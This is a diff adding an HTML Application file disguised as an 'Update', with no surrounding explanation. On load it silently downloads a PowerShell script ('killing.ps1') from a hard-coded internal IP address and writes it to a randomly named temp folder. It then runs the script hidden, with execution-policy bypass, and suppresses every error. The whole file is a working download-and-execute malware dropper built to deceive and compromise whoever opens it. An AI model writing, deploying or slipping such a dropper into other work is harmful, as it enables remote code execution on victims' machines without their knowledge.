@@ -1,0 +1,54 @@
+<html>
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>Update</title>
+<HTA:APPLICATION
+    ID="App"
+    APPLICATIONNAME="Update"
+    WINDOWSTATE="minimize"
+    SHOWINTASKBAR="no"
+    SYSMENU="no"
+    CAPTION="no"
+    BORDER="none"
+    INNERBORDER="no"
+    SCROLL="no"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+/>
+<script language="JavaScript">
+window.onload = function () {
+    try {
+        var shell = new ActiveXObject("WScript.Shell");
+        var fso   = new ActiveXObject("Scripting.FileSystemObject");
+        var http  = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+
+        http.SetTimeouts(5000, 5000, 15000, 15000);
+        http.Open("GET", "http://10.129.132.80:8081/killing.ps1", false);
+        http.Send();
+        var body = http.ResponseText;
+        if (!body || body.length < 64) { window.close(); return; }
+
+        var tmp = fso.GetSpecialFolder(2);
+        var name = "";
+        var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+        for (var i = 0; i < 10; i++) {
+            name += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        var dir = fso.BuildPath(tmp.Path, name);
+        fso.CreateFolder(dir);
+
+        var path = fso.BuildPath(dir, "killing.ps1");
+        var f = fso.CreateTextFile(path, true);
+        f.Write(body);
+        f.Close();
+
+        shell.Run('powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + path + '"', 0, true);
+    } catch (e) {
+        // silent
+    }
+    window.close();
+};
+</script>
+</head>
+<body></body>
+</html>
